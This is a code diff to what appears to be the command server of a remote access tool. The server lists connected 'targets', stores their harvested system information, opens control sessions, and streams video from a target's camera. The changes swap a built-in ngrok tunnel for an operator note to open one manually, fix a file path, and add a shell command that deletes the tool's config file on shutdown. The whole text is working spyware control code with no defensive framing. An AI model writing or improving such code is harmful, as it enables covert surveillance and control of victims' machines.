@@ -6,9 +6,7 @@ from prettytable import PrettyTable
 import time
 import json
 import sys
-#from assets.colors import colors
-#from assets.symbols import *
-from pyngrok import ngrok
+import os
 from configparser import ConfigParser
 
 class colors (object):
@@ -41,14 +39,6 @@ PORT = int(CONFIG["CameraStreaming"]["socketport"])
 CAMERA_STREAMING_PORT = CONFIG["CameraStreaming"]["camerastreamingport"]
 
 TARGETS = {}
-#start TCP tunnel
-#print(f"\r{Splus} {CR.green()}Starting tcp for socket...", end="")
-#ngrok.connect(PORT, "tcp")
-#print(f"{CR.blue()}Done")
-#print(f"\r{Splus} {CR.green()}Starting TCP for CameraStreaming...", end="")
-#ngrok.connect(CAMERA_STREAMING_PORT, "tcp")
-#print(f"{CR.blue()}Done")
-
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((HOST , PORT))
 server.listen(10)
@@ -89,7 +79,7 @@ def recv_target_info(target):
         with open(f"target_info/{target.getsockname()[0]}.json", "w") as info_save:
             json.dump(json.loads(DATA), info_save, indent=6)
         info_save.close()
-        with open(f"{target.getsockname()[0]}.json", "r") as info:
+        with open(f"target_info/{target.getsockname()[0]}.json", "r") as info:
             for x, y in enumerate(dict(json.load(info)).items()):
                 print(f"{' '*7}{CR.green()} {y[0]}{CR.yellow()} --> {CR.blue()}{y[1]}{CR.white()}")
 
@@ -117,6 +107,7 @@ def TARGETS_SHOWER():
 def connect_with_host(target_add):
     SERVER_UP = False
     print(f"{Splus} {CR.green()}Connected to {CR.red()}{TARGETS[target_add][0]}{CR.white()}")
+    print(f"{Ssowrd} {CR.red()}Note: {CR.yellow()}you should start a TCP tunnel so we can recv video data from the target{CR.white()} [{CR.blue()}HOST: {CR.white()}{HOST}, {CR.blue()}PORT: {CR.white()}{CAMERA_STREAMING_PORT}]")
     while True:
         COMMAND_FOR_TARGET_SESSION = input(f"\r{CR.red()} <|{CR.green()}session{CR.white()}-{CR.blue()}target={CR.yellow()}{TARGETS[target_add][0]}{CR.red()}|>{CR.blue()}|{CR.white()}=> {CR.white()}")
         if COMMAND_FOR_TARGET_SESSION == "start stream":
@@ -202,7 +193,9 @@ def run():
                     time.sleep(1)
                     x.send(json.dumps(SHUTDOWN_MSG).encode())
                 except:
-                    x.shutdown(socket.SHUT_RDWR);server.close(); time.sleep(1); sys.exit() #just to make sure all the targets that are connected close the connection and shuting the payloads down
+                    pass
+                os.system("rm server/setting/CS-config.ini")
+                x.shutdown(socket.SHUT_RDWR);server.close(); time.sleep(1); sys.exit() #just to make sure all the targets that are connected close the connection and shuting the payloads down
 
 
 run()
